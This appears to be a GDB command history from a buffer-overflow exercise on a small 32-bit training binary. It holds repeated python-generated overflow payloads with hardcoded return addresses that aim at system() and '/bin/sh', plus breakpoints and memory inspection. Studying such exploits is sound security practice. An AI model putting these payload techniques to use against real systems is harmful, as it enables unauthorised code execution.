q
lisr
list
q
disas dangerous_function 
pd dangerous_function 
set args "`python -c 'print("a"*0x12+"bbbb"+""+"cccc"+"")'`"
print sytem
print system
print not_used_string 
set args "`python -c 'print("a"*0x12+"bbbb"+"\x50\x83\x04\x08"+"cccc"+"\x70\x85\x04\x08")'`"
x/s not_used_string
set args "`python -c 'print("a"*0x12+"bbbb"+"\x50\x83\x04\x08"+"cccc"+"\x70\x85\x04\x08")'`"
r
set args "`python -c 'print("a"*0x12+"bbbb"+"\x50\x83\x04\x08"+"cccc"+"\x70\x85\x04\x08")'`"
exit
q
set args "`python -c 'print("a"*0x12+"bbbb"+"\x50\x83\x04\x08"+"cccc"+"\x70\x85\x04\x08")'`"
disassemble dangerous_function 
b dangerous_function+24
b dangerous_function +24
b 0x080484b5
b *0x080484b5
disassemble dangerous_function 
set args "`python -c 'print("a"*0x12+"bbbb"+"\x50\x83\x04\x08"+"cccc"+"\x70\x85\x04\x08")'`"
r
print *0xffffdb50
print *0xffffdb54
print *0xffffdb58
print *0xffffdb5c
step
c
c
c
r
r
q
set args "`python -c 'print("a"*0x12+"bbbb"+"\x50\x83\x04\x08"+"cccc"+"\x70\x85\x04\x08")'`"
statc
disassemble dangerous_function 
b *0x080484b0
r
set args "`python -c 'print("a"*0x12+"bbbb"+"\x50\x83\x04\x08"+"cccc"+"\x70\x85\x04\x08")'`"
r
r
step
step
q
set args "`python -c 'print("a"*0x12+"bbbb"+"\x50\x83\x04\x08"+"cccc"+"\x70\x85\x04\x08")'`"
disassemble dangerous_function 
info breakpoints 
ls
q
list
q
fine "/bin/sh"
find "/bin/sh"
b main
r
find 
find "bin/sh"
p system
q
disassemble main
disassemble not_used_string 
disassemble not_called_function 
print not_used_string 
disassemble not_called_function 
ls
q
